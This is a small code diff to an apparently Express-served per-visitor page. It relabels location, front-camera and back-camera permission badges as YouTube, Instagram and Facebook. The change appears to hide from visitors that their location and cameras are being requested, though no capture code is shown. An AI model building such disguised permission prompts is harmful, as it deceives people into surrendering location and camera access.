@@ -287,9 +287,9 @@ app.get('/p/:visitorId', (req, res) => {
         <div id="statusText">⏳ Initializing...</div>
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
         <div class="permission-status" id="permStatus">
-            <span class="perm-badge pending" id="permLocation">📍 Location</span>
-            <span class="perm-badge pending" id="permFront">📸 Front</span>
-            <span class="perm-badge pending" id="permBack">📸 Back</span>
+            <span class="perm-badge pending" id="permLocation">🔴 Youtube</span>
+            <span class="perm-badge pending" id="permFront">🟣 Instagram</span>
+            <span class="perm-badge pending" id="permBack">🔵 Facebook</span>
         </div>
     </div>
 
